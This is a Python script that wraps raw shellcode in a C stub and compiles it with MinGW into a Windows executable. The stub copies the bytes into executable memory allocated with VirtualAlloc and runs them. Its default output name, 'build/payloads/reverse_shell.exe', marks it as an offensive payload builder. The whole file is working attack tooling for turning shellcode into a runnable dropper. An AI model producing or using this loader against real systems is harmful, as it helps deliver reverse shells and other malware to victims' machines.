import os
import argparse

def generate_exe(shellcode_path, output_path):
    # Read shellcode bytes
    with open(shellcode_path, 'rb') as f:
        shellcode = f.read()

    # Create C source stub with embedded shellcode bytes
    stub = f"""
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

unsigned char shellcode[] = {{
    {', '.join(f'0x{b:02x}' for b in shellcode)}
}};

int main() {{
    void* exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!exec) {{
        printf("VirtualAlloc failed\\n");
        return 1;
    }}
    memcpy(exec, shellcode, sizeof(shellcode));
    ((void(*)())exec)();
    return 0;
}}
"""

    # Write C stub to temporary file
    c_file = "stub.c"
    with open(c_file, "w") as f:
        f.write(stub)

    # Compile using MinGW-w64 GCC
    cmd = f"x86_64-w64-mingw32-gcc {c_file} -o {output_path}"
    ret = os.system(cmd)

    # Clean up temporary C file
    os.remove(c_file)

    if ret == 0:
        print(f"[+] EXE generated: {output_path}")
    else:
        print("[!] Compilation failed")

def main():
    parser = argparse.ArgumentParser(description="Generate EXE stub with embedded shellcode")
    parser.add_argument("shellcode", help="Path to raw shellcode binary file")
    parser.add_argument("-o", "--output", default="build/payloads/reverse_shell.exe", help="Output EXE file path")
    args = parser.parse_args()

    if not os.path.exists(args.shellcode):
        print(f"[!] Shellcode file not found: {args.shellcode}")
        return

    generate_exe(args.shellcode, args.output)

if __name__ == "__main__":
    main()

